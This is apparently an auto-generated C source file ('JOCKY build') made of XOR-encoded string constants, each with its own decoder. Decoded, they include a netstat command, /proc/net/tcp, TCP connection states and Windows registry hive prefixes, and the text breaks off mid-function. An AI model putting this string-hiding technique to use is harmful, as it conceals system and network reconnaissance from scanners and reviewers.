// JOCKY build 2AA95D66ECF0C36B seed=12345 date=2026-09-03 05:00:02
#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>

#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0600
#endif
#if defined(_WIN32)
#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <tlhelp32.h>
#include <direct.h>
#elif defined(__APPLE__)
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/sysctl.h>
#include <libproc.h>
#else
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>
#endif

static const volatile uint8_t j_enc_0[] = {0x22, 0x23, 0x20, 0x21, 0x26, 0x27, 0x24, 0x25, 0x2A, 0x2B, 0x73, 0x70, 0x71, 0x76, 0x77, 0x74};
static const char* j_dc_0(void) {
    static char j_rb[17];
    for (int j_i = 0; j_i < 16; j_i++) j_rb[j_i] = j_enc_0[j_i] ^ 18;
    j_rb[16] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_1[] = {0xB9, 0xB8, 0xBB, 0xBA, 0xBD, 0xBC, 0xBF, 0xBE, 0xB1, 0xB0, 0xE8, 0xEB, 0xEA, 0xED, 0xEC, 0xEF};
static const char* j_dc_1(void) {
    static char j_rb[17];
    for (int j_i = 0; j_i < 16; j_i++) j_rb[j_i] = j_enc_1[j_i] ^ 137;
    j_rb[16] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_2[] = {0x20, 0x30};
static const char* j_dc_2(void) {
    static char j_rb[3];
    for (int j_i = 0; j_i < 2; j_i++) j_rb[j_i] = j_enc_2[j_i] ^ 82;
    j_rb[2] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_3[] = {0xD4, 0xC1};
static const char* j_dc_3(void) {
    static char j_rb[3];
    for (int j_i = 0; j_i < 2; j_i++) j_rb[j_i] = j_enc_3[j_i] ^ 163;
    j_rb[2] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_4[] = {0x31, 0x6E, 0x6C, 0x71, 0x7D};
static const char* j_dc_4(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_4[j_i] ^ 30;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_5[] = {0xFF};
static const char* j_dc_5(void) {
    static char j_rb[2];
    for (int j_i = 0; j_i < 1; j_i++) j_rb[j_i] = j_enc_5[j_i] ^ 141;
    j_rb[1] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_6[] = {0xD7};
static const char* j_dc_6(void) {
    static char j_rb[2];
    for (int j_i = 0; j_i < 1; j_i++) j_rb[j_i] = j_enc_6[j_i] ^ 221;
    j_rb[1] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_7[] = {0xEA};
static const char* j_dc_7(void) {
    static char j_rb[2];
    for (int j_i = 0; j_i < 1; j_i++) j_rb[j_i] = j_enc_7[j_i] ^ 152;
    j_rb[1] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_8[] = {0x6B};
static const char* j_dc_8(void) {
    static char j_rb[2];
    for (int j_i = 0; j_i < 1; j_i++) j_rb[j_i] = j_enc_8[j_i] ^ 84;
    j_rb[1] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_9[] = {0xB6, 0xB3, 0xA9, 0xAE, 0xBF, 0xB4};
static const char* j_dc_9(void) {
    static char j_rb[7];
    for (int j_i = 0; j_i < 6; j_i++) j_rb[j_i] = j_enc_9[j_i] ^ 250;
    j_rb[6] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_10[] = {0x57, 0x41, 0x46, 0x53, 0x50, 0x5E, 0x5B, 0x41, 0x5A, 0x57, 0x56};
static const char* j_dc_10(void) {
    static char j_rb[12];
    for (int j_i = 0; j_i < 11; j_i++) j_rb[j_i] = j_enc_10[j_i] ^ 18;
    j_rb[11] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_11[] = {0x79, 0x76, 0x75, 0x69, 0x7F, 0x65, 0x6D, 0x7B, 0x73, 0x6E};
static const char* j_dc_11(void) {
    static char j_rb[11];
    for (int j_i = 0; j_i < 10; j_i++) j_rb[j_i] = j_enc_11[j_i] ^ 58;
    j_rb[10] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_12[] = {0x66, 0x7B, 0x7F, 0x77, 0x6D, 0x65, 0x73, 0x7B, 0x66};
static const char* j_dc_12(void) {
    static char j_rb[10];
    for (int j_i = 0; j_i < 9; j_i++) j_rb[j_i] = j_enc_12[j_i] ^ 50;
    j_rb[9] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_13[] = {0x38, 0x23, 0x3F, 0x32, 0x25};
static const char* j_dc_13(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_13[j_i] ^ 119;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_14[] = {0x0D, 0x06, 0x17, 0x10, 0x17, 0x02, 0x17, 0x43, 0x4E, 0x02, 0x0D, 0x43, 0x4E, 0x13, 0x43, 0x17, 0x00, 0x13, 0x43, 0x51, 0x5D, 0x4C, 0x07, 0x06, 0x15, 0x4C, 0x0D, 0x16, 0x0F, 0x0F};
static const char* j_dc_14(void) {
    static char j_rb[31];
    for (int j_i = 0; j_i < 30; j_i++) j_rb[j_i] = j_enc_14[j_i] ^ 99;
    j_rb[30] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_15[] = {0x9D};
static const char* j_dc_15(void) {
    static char j_rb[2];
    for (int j_i = 0; j_i < 1; j_i++) j_rb[j_i] = j_enc_15[j_i] ^ 239;
    j_rb[1] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_16[] = {0xA7, 0xB0, 0xA3};
static const char* j_dc_16(void) {
    static char j_rb[4];
    for (int j_i = 0; j_i < 3; j_i++) j_rb[j_i] = j_enc_16[j_i] ^ 211;
    j_rb[3] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_17[] = {0x45, 0x1A, 0x18, 0x05, 0x09, 0x45, 0x04, 0x0F, 0x1E, 0x45, 0x1E, 0x09, 0x1A};
static const char* j_dc_17(void) {
    static char j_rb[14];
    for (int j_i = 0; j_i < 13; j_i++) j_rb[j_i] = j_enc_17[j_i] ^ 106;
    j_rb[13] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_18[] = {0xEC, 0xB3, 0xB1, 0xAC, 0xA0, 0xEC, 0xAD, 0xA6, 0xB7, 0xEC, 0xB7, 0xA0, 0xB3, 0xF5};
static const char* j_dc_18(void) {
    static char j_rb[15];
    for (int j_i = 0; j_i < 14; j_i++) j_rb[j_i] = j_enc_18[j_i] ^ 195;
    j_rb[14] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_19[] = {0x9E, 0x9D, 0x9A, 0x9B, 0x8A};
static const char* j_dc_19(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_19[j_i] ^ 214;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_20[] = {0x95, 0x96, 0x9E, 0x88, 0x81};
static const char* j_dc_20(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_20[j_i] ^ 221;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_21[] = {0x4E, 0x4D, 0x45, 0x54, 0x5A};
static const char* j_dc_21(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_21[j_i] ^ 6;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_22[] = {0xA4, 0xA7, 0xB9, 0xB0};
static const char* j_dc_22(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_22[j_i] ^ 236;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_23[] = {0x49, 0x5C};
static const char* j_dc_23(void) {
    static char j_rb[3];
    for (int j_i = 0; j_i < 2; j_i++) j_rb[j_i] = j_enc_23[j_i] ^ 62;
    j_rb[2] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_24[] = {0xCD, 0xCB, 0xCC, 0xDC};
static const char* j_dc_24(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_24[j_i] ^ 185;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_25[] = {0xE9, 0xEE, 0xE3, 0xFC, 0xEA};
static const char* j_dc_25(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_25[j_i] ^ 143;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_26[] = {0x50, 0x56, 0x51, 0x41};
static const char* j_dc_26(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_26[j_i] ^ 36;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_27[] = {0x93, 0x94, 0x99, 0x86, 0x90};
static const char* j_dc_27(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_27[j_i] ^ 245;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_28[] = {0x23, 0x25, 0x22, 0x32};
static const char* j_dc_28(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_28[j_i] ^ 87;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_29[] = {0xF3, 0xF4, 0xF9, 0xE6, 0xF0};
static const char* j_dc_29(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_29[j_i] ^ 149;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_30[] = {0x20, 0x26, 0x21, 0x31};
static const char* j_dc_30(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_30[j_i] ^ 84;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_31[] = {0x12, 0x15, 0x18, 0x07, 0x11};
static const char* j_dc_31(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_31[j_i] ^ 116;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_32[] = {0x33, 0x35, 0x32, 0x22};
static const char* j_dc_32(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_32[j_i] ^ 71;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_33[] = {0xBA, 0xBD, 0xB0, 0xAF, 0xB9};
static const char* j_dc_33(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_33[j_i] ^ 220;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_34[] = {0x63, 0x65, 0x62, 0x72};
static const char* j_dc_34(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_34[j_i] ^ 23;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_35[] = {0x08, 0x0F, 0x02, 0x1D, 0x0B};
static const char* j_dc_35(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_35[j_i] ^ 110;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_36[] = {0x80, 0x86, 0x81, 0x91};
static const char* j_dc_36(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_36[j_i] ^ 244;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_37[] = {0x3A, 0x3D, 0x30, 0x2F, 0x39};
static const char* j_dc_37(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_37[j_i] ^ 92;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_38[] = {0x67, 0x61, 0x66, 0x76};
static const char* j_dc_38(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_38[j_i] ^ 19;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_39[] = {0x35, 0x32, 0x3F, 0x20, 0x36};
static const char* j_dc_39(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_39[j_i] ^ 83;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_40[] = {0x15, 0x13, 0x14, 0x04};
static const char* j_dc_40(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_40[j_i] ^ 97;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_41[] = {0x45, 0x42, 0x4F, 0x50, 0x46};
static const char* j_dc_41(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_41[j_i] ^ 35;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_42[] = {0x66, 0x60, 0x67, 0x77};
static const char* j_dc_42(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_42[j_i] ^ 18;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_43[] = {0xAE, 0xA9, 0xA4, 0xBB, 0xAD};
static const char* j_dc_43(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_43[j_i] ^ 200;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_44[] = {0x5B, 0x5D, 0x5A, 0x4A};
static const char* j_dc_44(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_44[j_i] ^ 47;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_45[] = {0x95, 0x92, 0x9F, 0x80, 0x96};
static const char* j_dc_45(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_45[j_i] ^ 243;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_46[] = {0xDD, 0xDB, 0xDC, 0xCC};
static const char* j_dc_46(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_46[j_i] ^ 169;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_47[] = {0x08, 0x0F, 0x02, 0x1D, 0x0B};
static const char* j_dc_47(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_47[j_i] ^ 110;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_48[] = {0x88, 0x8E, 0x89, 0x99};
static const char* j_dc_48(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_48[j_i] ^ 252;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_49[] = {0x06, 0x01, 0x0C, 0x13, 0x05};
static const char* j_dc_49(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_49[j_i] ^ 96;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_50[] = {0xE5, 0xE3, 0xE4, 0xF4};
static const char* j_dc_50(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_50[j_i] ^ 145;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_51[] = {0x52, 0x55, 0x58, 0x47, 0x51};
static const char* j_dc_51(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_51[j_i] ^ 52;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_52[] = {0xB5, 0xB3, 0xB4, 0xA4};
static const char* j_dc_52(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_52[j_i] ^ 193;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_53[] = {0x04, 0x03, 0x0E, 0x11, 0x07};
static const char* j_dc_53(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_53[j_i] ^ 98;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_54[] = {0x30, 0x36, 0x31, 0x21};
static const char* j_dc_54(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_54[j_i] ^ 68;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_55[] = {0x34, 0x33, 0x3E, 0x21, 0x37};
static const char* j_dc_55(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_55[j_i] ^ 82;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_56[] = {0x94, 0x92, 0x95, 0x85};
static const char* j_dc_56(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_56[j_i] ^ 224;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_57[] = {0x92, 0x95, 0x98, 0x87, 0x91};
static const char* j_dc_57(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_57[j_i] ^ 244;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_58[] = {0xBD, 0xBB, 0xBC, 0xAC};
static const char* j_dc_58(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_58[j_i] ^ 201;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_59[] = {0x4D, 0x4A, 0x47, 0x58, 0x4E};
static const char* j_dc_59(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_59[j_i] ^ 43;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_60[] = {0x9F, 0x99, 0x9E, 0x8E};
static const char* j_dc_60(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_60[j_i] ^ 235;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_61[] = {0x18, 0x1F, 0x12, 0x0D, 0x1B};
static const char* j_dc_61(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_61[j_i] ^ 126;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_62[] = {0x26, 0x20, 0x27, 0x37};
static const char* j_dc_62(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_62[j_i] ^ 82;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_63[] = {0x07, 0x00, 0x0D, 0x12, 0x04};
static const char* j_dc_63(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_63[j_i] ^ 97;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_64[] = {0xF2, 0xF4, 0xF3, 0xE3};
static const char* j_dc_64(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_64[j_i] ^ 134;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_65[] = {0x8D, 0x8A, 0x87, 0x98, 0x8E};
static const char* j_dc_65(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_65[j_i] ^ 235;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_66[] = {0xDB, 0xDD, 0xDA, 0xCA};
static const char* j_dc_66(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_66[j_i] ^ 175;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_67[] = {0x76, 0x71, 0x7C, 0x63, 0x75};
static const char* j_dc_67(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_67[j_i] ^ 16;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_68[] = {0xF7, 0xF1, 0xF6, 0xE6};
static const char* j_dc_68(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_68[j_i] ^ 131;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_69[] = {0x92, 0x95, 0x98, 0x87, 0x91};
static const char* j_dc_69(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_69[j_i] ^ 244;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_70[] = {0x11, 0x17, 0x10, 0x00};
static const char* j_dc_70(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_70[j_i] ^ 101;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_71[] = {0x92, 0x95, 0x98, 0x87, 0x91};
static const char* j_dc_71(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_71[j_i] ^ 244;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_72[] = {0x9A, 0x9C, 0x9B, 0x8B};
static const char* j_dc_72(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_72[j_i] ^ 238;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_73[] = {0x4B, 0x4C, 0x41, 0x5E, 0x48};
static const char* j_dc_73(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_73[j_i] ^ 45;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_74[] = {0xB5, 0xB3, 0xB4, 0xA4};
static const char* j_dc_74(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_74[j_i] ^ 193;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_75[] = {0x7C, 0x7B, 0x76, 0x69, 0x7F};
static const char* j_dc_75(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_75[j_i] ^ 26;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_76[] = {0xF0, 0xF6, 0xF1, 0xE1};
static const char* j_dc_76(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_76[j_i] ^ 132;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_77[] = {0xB4, 0xB3, 0xBE, 0xA1, 0xB7};
static const char* j_dc_77(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_77[j_i] ^ 210;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_78[] = {0xB0, 0xB6, 0xB1, 0xA1};
static const char* j_dc_78(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_78[j_i] ^ 196;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_79[] = {0xA9, 0xAE, 0xA3, 0xBC, 0xAA};
static const char* j_dc_79(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_79[j_i] ^ 207;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_80[] = {0x03, 0x05, 0x02, 0x12};
static const char* j_dc_80(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_80[j_i] ^ 119;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_81[] = {0xA8, 0xAF, 0xA2, 0xBD, 0xAB};
static const char* j_dc_81(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_81[j_i] ^ 206;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_82[] = {0xB0, 0xB6, 0xB1, 0xA1};
static const char* j_dc_82(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_82[j_i] ^ 196;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_83[] = {0x97, 0x90, 0x9D, 0x82, 0x94};
static const char* j_dc_83(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_83[j_i] ^ 241;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_84[] = {0x58, 0x5E, 0x59, 0x49};
static const char* j_dc_84(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_84[j_i] ^ 44;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_85[] = {0x50, 0x57, 0x5A, 0x45, 0x53};
static const char* j_dc_85(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_85[j_i] ^ 54;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_86[] = {0xB0, 0xB6, 0xB1, 0xA1};
static const char* j_dc_86(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_86[j_i] ^ 196;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_87[] = {0x40, 0x47, 0x4A, 0x55, 0x43};
static const char* j_dc_87(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_87[j_i] ^ 38;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_88[] = {0x28, 0x2E, 0x29, 0x39};
static const char* j_dc_88(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_88[j_i] ^ 92;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_89[] = {0xEA, 0xED, 0xE0, 0xFF, 0xE9};
static const char* j_dc_89(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_89[j_i] ^ 140;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_90[] = {0x10, 0x16, 0x11, 0x01};
static const char* j_dc_90(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_90[j_i] ^ 100;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_91[] = {0x73, 0x74, 0x79, 0x66, 0x70};
static const char* j_dc_91(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_91[j_i] ^ 21;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_92[] = {0x51, 0x57, 0x50, 0x40};
static const char* j_dc_92(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_92[j_i] ^ 37;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_93[] = {0x6C, 0x6B, 0x66, 0x79, 0x6F};
static const char* j_dc_93(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_93[j_i] ^ 10;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_94[] = {0x82, 0x84, 0x83, 0x93};
static const char* j_dc_94(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_94[j_i] ^ 246;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_95[] = {0x4D, 0x4A, 0x47, 0x58, 0x4E};
static const char* j_dc_95(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_95[j_i] ^ 43;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_96[] = {0x2F, 0x29, 0x2E, 0x3E};
static const char* j_dc_96(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_96[j_i] ^ 91;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_97[] = {0xE0, 0xE7, 0xEA, 0xF5, 0xE3};
static const char* j_dc_97(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_97[j_i] ^ 134;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_98[] = {0x29, 0x2F, 0x28, 0x38};
static const char* j_dc_98(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_98[j_i] ^ 93;
    j_rb[4] = 0;
